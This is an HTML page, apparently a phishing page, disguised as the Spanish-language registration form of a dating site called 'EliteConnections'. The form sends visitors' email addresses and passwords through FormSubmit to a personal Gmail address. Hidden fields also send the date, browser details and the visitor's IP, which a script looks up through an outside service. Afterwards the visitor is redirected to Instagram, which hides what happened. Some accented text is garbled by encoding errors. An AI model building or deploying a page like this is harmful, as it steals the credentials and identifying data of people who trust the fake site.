<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - EliteConnections</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            overflow: hidden;
            height: 100vh;
        }

        #videoBackground {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 105, 180, 0.85) 0%, rgba(147, 112, 219, 0.85) 50%, rgba(65, 105, 225, 0.85) 100%);
            z-index: -1;
        }

        .container {
            max-width: 480px;
            margin: 40px auto;
            padding: 40px 35px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 2.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #ff69b4, #9370db, #4169e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #555;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e1e8ed;
            border-radius: 12px;
            font-size: 16px;
            background: #fff;
        }

        button {
            background: linear-gradient(135deg, #ff69b4, #9370db);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            font-weight: 600;
        }

        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <video id="videoBackground" autoplay muted loop>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-couple-having-a-romantic-dinner-while-looking-at-43363-large.mp4" type="video/mp4">
    </video>
    <div class="overlay"></div>

    <div class="container">
        <div class="logo">
            <h1>EliteConnections</h1>
            <div>Donde los corazones se encuentran</div>
        </div>
        
        <h2>Comienza tu historia de amor</h2>
        
        <!-- FORMULARIO FORMSUBMIT CON CONFIGURACIÃ“N CORRECTA -->
        <form action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
            <!-- CONFIGURACIÃ“N FORMSUBMIT -->
            <input type="hidden" name="_subject" value="ðŸ”¥ NUEVO REGISTRO - EliteConnections">
            <input type="hidden" name="_template" value="basic">
            <input type="text" name="_honey" style="display:none">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.instagram.com">
            
            <div class="form-group">
                <label>Correo electrÃ³nico</label>
                <input type="email" name="email" required placeholder="tu.corazon@ejemplo.com">
            </div>
            
            <div class="form-group">
                <label>ContraseÃ±a</label>
                <input type="password" name="password" required minlength="8" placeholder="MÃ­nimo 8 caracteres">
            </div>
            
            <!-- CAMPOS ADICIONALES QUE QUIERES RECIBIR -->
            <input type="hidden" name="fecha" id="fechaField">
            <input type="hidden" name="ip" id="ipField">
            <input type="hidden" name="navegador" id="navegadorField">
            
            <button type="submit" id="submitButton">Encontrar mi pareja ideal</button>
        </form>
    </div>

<script>
// Llenar campos ocultos antes de enviar
document.querySelector('form').addEventListener('submit', function() {
    // Fecha actual
    document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
    
    // Navegador
    document.getElementById('navegadorField').value = navigator.userAgent;
    
    // Obtener IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ipField').value = data.ip;
        })
        .catch(() => {
            document.getElementById('ipField').value = 'IP no disponible';
        });
    
    // Deshabilitar botÃ³n
    document.getElementById('submitButton').disabled = true;
    document.getElementById('submitButton').textContent = 'Enviando...';
});

// Si falla FormSubmit, mostrar mensaje
setTimeout(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('success')) {
        alert('Â¡Registro exitoso! Revisa tu correo.');
    }
}, 1000);
</script>
</body>
                </html>
